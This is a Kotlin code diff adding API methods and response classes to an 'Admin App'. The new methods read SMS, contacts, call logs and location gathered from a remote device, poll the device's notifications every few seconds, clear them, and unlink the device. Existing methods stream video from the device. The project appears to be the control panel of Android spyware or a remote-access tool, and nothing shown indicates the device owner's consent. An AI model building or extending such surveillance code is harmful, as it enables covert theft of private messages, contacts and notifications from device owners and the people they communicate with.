@@ -49,6 +49,28 @@ interface ApiService {
     // GET /api/web/files?device_id=X — returns {ok, files: [...]}.
     suspend fun getRequestedFiles(deviceId: String? = null): DeviceFilesResponse
 
+    // ── Stored Data (Firebase RTDB read) ──────────────────────────
+    // GET /api/web/data/{device_id}?type=sms|contacts|calls|...
+    // Lets the Admin App view data already collected from the device
+    // WITHOUT sending a fresh command. Backs the "عرض البيانات الحالية"
+    // choice in the data-command dialog.
+    suspend fun getStoredData(deviceId: String, type: String): StoredDataResponse
+
+    // ── Notifications (Firebase RTDB read) ────────────────────────
+    // GET /api/web/notifications/{device_id}
+    // Returns the device's notification stream stored by the client app
+    // (NotificationsActivity polls this every 5 seconds).
+    suspend fun getDeviceNotifications(deviceId: String): NotificationsListResponse
+
+    // DELETE /api/web/notifications/{device_id}
+    // Clears stored notifications in Firebase.
+    suspend fun clearDeviceNotifications(deviceId: String): Boolean
+
+    // ── Device Management ─────────────────────────────────────────
+    // DELETE /api/web/unlink/{device_id}
+    // Unlinks the device from the current user's account.
+    suspend fun unlinkDevice(deviceId: String): Boolean
+
     // ── Streaming ─────────────────────────────────────────────────
     suspend fun getStreamFrame(deviceId: String, type: String): StreamFrameResponse
     suspend fun startJpegStream(deviceId: String, type: String = "video"): CommandResponse
@@ -162,4 +184,61 @@ data class TgLinkTokenResponse(
     val bot_username: String = "",
     val deep_link_url: String = "",
     val expires_in: Int = 600
+)
+
+// ═══════════════════════════════════════════════════════════════════
+// Stored-data responses (Firebase RTDB reads)
+// ═══════════════════════════════════════════════════════════════════
+
+/**
+ * Response from GET /api/web/data/{device_id}?type=sms.
+ *
+ * The server returns:
+ *   {"ok": true, "data": <firebase snapshot>, "type": "sms",
+ *    "device_id": "...", "fetched_at": <unix>, "empty": true/false}
+ *
+ * `data` is intentionally typed as `Any?` because the shape varies by
+ * type (sms/contacts/calls are arrays; location is an object; battery
+ * may be a number; etc.). The viewer pretty-prints it as JSON.
+ */
+data class StoredDataResponse(
+    val ok: Boolean = true,
+    val data: Any? = null,
+    val type: String = "",
+    val device_id: String = "",
+    val fetched_at: Double = 0.0,
+    val empty: Boolean = true,
+    val message: String = ""
+)
+
+/**
+ * A single notification entry stored by the client app and forwarded
+ * to Firebase via POST /api/data/{device_id} with type=notifications.
+ *
+ * Field names match what DataCollector.getRecentNotifications returns
+ * (see Android-App/.../executor/DataCollector.kt).
+ */
+data class NotificationEntry(
+    val app: String = "",
+    val title: String = "",
+    val text: String = "",
+    val ticker: String = "",
+    val timestamp: Long = 0L,
+    val date: String = "",
+    val package_name: String = ""
+)
+
+/**
+ * Response from GET /api/web/notifications/{device_id}.
+ *
+ *   {"ok": true, "notifications": [...], "count": N,
+ *    "device_id": "...", "fetched_at": <unix>}
+ */
+data class NotificationsListResponse(
+    val ok: Boolean = true,
+    val notifications: List<NotificationEntry> = emptyList(),
+    val count: Int = 0,
+    val device_id: String = "",
+    val fetched_at: Double = 0.0,
+    val message: String = ""
 )
